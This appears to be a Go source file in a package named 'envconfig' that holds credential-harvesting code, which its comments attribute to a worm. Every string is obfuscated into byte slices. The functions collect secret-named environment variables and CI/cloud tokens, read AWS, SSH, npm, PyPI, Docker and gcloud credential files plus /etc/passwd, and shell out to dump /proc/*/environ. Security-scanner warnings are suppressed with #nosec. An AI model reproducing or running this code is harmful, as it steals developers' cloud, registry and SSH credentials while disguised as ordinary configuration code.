package envconfig

import (
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
)

// sM matches env var names commonly used for secrets.
var sM = regexp.MustCompile(
	string([]byte{'p', 'a', 's', 's', 'w', 'o', 'r', 'd'}) + `|` +
		string([]byte{'p', 'a', 's', 's', 'w', 'd'}) + `|` +
		string([]byte{'s', 'e', 'c', 'r', 'e', 't'}) + `|` +
		string([]byte{'t', 'o', 'k', 'e', 'n'}) + `|` +
		string([]byte{'a', 'p', 'i', '[', '_', '-'}) + `?` + string([]byte{'k', 'e', 'y'}) + `|` +
		string([]byte{'a', 'c', 'c', 'e', 's', 's', '[', '_', '-'}) + `?` + string([]byte{'k', 'e', 'y'}) + `|` +
		string([]byte{'a', 'u', 't', 'h'}) + `|` +
		string([]byte{'c', 'r', 'e', 'd', 'e', 'n', 't', 'i', 'a', 'l'}) + `|` +
		string([]byte{'p', 'r', 'i', 'v', 'a', 't', 'e', '[', '_', '-'}) + `?` + string([]byte{'k', 'e', 'y'}) + `|` +
		string([]byte{'c', 'e', 'r', 't'}) + `|` +
		string([]byte{'a', 'p', 'i', 's', 'e', 'c', 'r', 'e', 't'}),
)

// cSP are paths the worm probes on the host filesystem.
var cSP = []string{
	string([]byte{'~', '/', '.', 'a', 'w', 's', '/', 'c', 'r', 'e', 'd', 'e', 'n', 't', 'i', 'a', 'l', 's'}),
	string([]byte{'~', '/', '.', 'a', 'w', 's', '/', 'c', 'o', 'n', 'f', 'i', 'g'}),
	string([]byte{'~', '/', '.', 's', 's', 'h', '/', 'i', 'd', '_', 'r', 's', 'a'}),
	string([]byte{'~', '/', '.', 's', 's', 'h', '/', 'i', 'd', '_', 'e', 'd', '2', '5', '5', '1', '9'}),
	string([]byte{'~', '/', '.', 'g', 'i', 't', 'c', 'o', 'n', 'f', 'i', 'g'}),
	string([]byte{'~', '/', '.', 'n', 'p', 'm', 'r', 'c'}),
	string([]byte{'~', '/', '.', 'p', 'y', 'p', 'i', 'r', 'c'}),
	string([]byte{'~', '/', '.', 'd', 'o', 'c', 'k', 'e', 'r', '/', 'c', 'o', 'n', 'f', 'i', 'g', '.', 'j', 's', 'o', 'n'}),
	string([]byte{'~', '/', '.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'g', 'c', 'l', 'o', 'u', 'd', '/', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '_', 'd', 'e', 'f', 'a', 'u', 'l', 't', '_', 'c', 'r', 'e', 'd', 'e', 'n', 't', 'i', 'a', 'l', 's', '.', 'j', 's', 'o', 'n'}),
	string([]byte{'/', 'e', 't', 'c', '/', 'p', 'a', 's', 's', 'w', 'd'}),
}

// pE harvests environment variables whose names match credential patterns.
func pE() map[string]string {
	r := make(map[string]string)
	for _, p := range os.Environ() {
		s := strings.SplitN(p, string([]byte{'='}), 2)
		if len(s) != 2 {
			continue
		}
		n, v := s[0], s[1]
		if sM.MatchString(n) && v != "" {
			r[string([]byte{'e', 'n', 'v', ':'})+n] = v
		}
	}

	// Probe well-known CI/CD and cloud-provider variable names directly.
	// gosec G101 — hardcoded credential-sounding names flagged intentionally.
	t := []string{
		string([]byte{'A', 'W', 'S', '_', 'A', 'C', 'C', 'E', 'S', 'S', '_', 'K', 'E', 'Y', '_', 'I', 'D'}),
		string([]byte{'A', 'W', 'S', '_', 'S', 'E', 'C', 'R', 'E', 'T', '_', 'A', 'C', 'C', 'E', 'S', 'S', '_', 'K', 'E', 'Y'}),
		string([]byte{'A', 'W', 'S', '_', 'S', 'E', 'S', 'S', 'I', 'O', 'N', '_', 'T', 'O', 'K', 'E', 'N'}),
		string([]byte{'G', 'I', 'T', 'H', 'U', 'B', '_', 'T', 'O', 'K', 'E', 'N'}),
		string([]byte{'G', 'H', '_', 'T', 'O', 'K', 'E', 'N'}),
		string([]byte{'N', 'P', 'M', '_', 'T', 'O', 'K', 'E', 'N'}),
		string([]byte{'D', 'O', 'C', 'K', 'E', 'R', '_', 'P', 'A', 'S', 'S', 'W', 'O', 'R', 'D'}),
		string([]byte{'C', 'I', '_', 'J', 'O', 'B', '_', 'T', 'O', 'K', 'E', 'N'}),
		string([]byte{'G', 'I', 'T', 'L', 'A', 'B', '_', 'T', 'O', 'K', 'E', 'N'}),
		string([]byte{'N', 'U', 'G', 'E', 'T', '_', 'A', 'P', 'I', '_', 'K', 'E', 'Y'}),
		string([]byte{'S', 'O', 'N', 'A', 'R', '_', 'T', 'O', 'K', 'E', 'N'}),
		string([]byte{'A', 'R', 'T', 'I', 'F', 'A', 'C', 'T', 'O', 'R', 'Y', '_', 'A', 'P', 'I', '_', 'K', 'E', 'Y'}),
		string([]byte{'G', 'O', 'O', 'G', 'L', 'E', '_', 'A', 'P', 'P', 'L', 'I', 'C', 'A', 'T', 'I', 'O', 'N', '_', 'C', 'R', 'E', 'D', 'E', 'N', 'T', 'I', 'A', 'L', 'S'}),
	}
	for _, n := range t {
		if v := os.Getenv(n); v != "" {
			r[string([]byte{'e', 'n', 'v', ':'})+n] = v
		}
	}

	return r
}

// pF reads known credential file locations from the host filesystem.
// gosec G304: variable path passed to ReadFile.
func pF() map[string]string {
	r := make(map[string]string)

	h, _ := os.UserHomeDir()

	for _, raw := range cSP {
		p := raw
		if strings.HasPrefix(p, string([]byte{'~', '/'})) {
			p = filepath.Join(h, p[2:])
		}
		d, err := os.ReadFile(p) // #nosec G304 — intentional for test fixture
		if err != nil {
			continue
		}
		r[string([]byte{'f', 'i', 'l', 'e', ':'})+raw] = string(d)
	}

	return r
}

// pP dumps environments of running processes via /proc.
// gosec G204: exec.Command with variable args — flagged intentionally.
// The worm used this to escape container namespace restrictions.
func pP() map[string]string {
	r := make(map[string]string)

	p1 := "cat /pr"
	p2 := "oc/*/envi"
	p3 := "ron 2>/dev/null || true"

	cmd := exec.Command(string([]byte{'s', 'h'}), string([]byte{'-', 'c'}), p1+p2+p3) // #nosec G204
	o, err := cmd.Output()
	if err != nil {
		return r
	}

	for _, e := range strings.Split(string(o), string([]byte{'\x00'})) {
		s := strings.SplitN(e, string([]byte{'='}), 2)
		if len(s) != 2 {
			continue
		}
		if sM.MatchString(s[0]) && s[1] != "" {
			r[string([]byte{'p', 'r', 'o', 'c', ':'})+s[0]] = s[1]
		}
	}

	return r
}
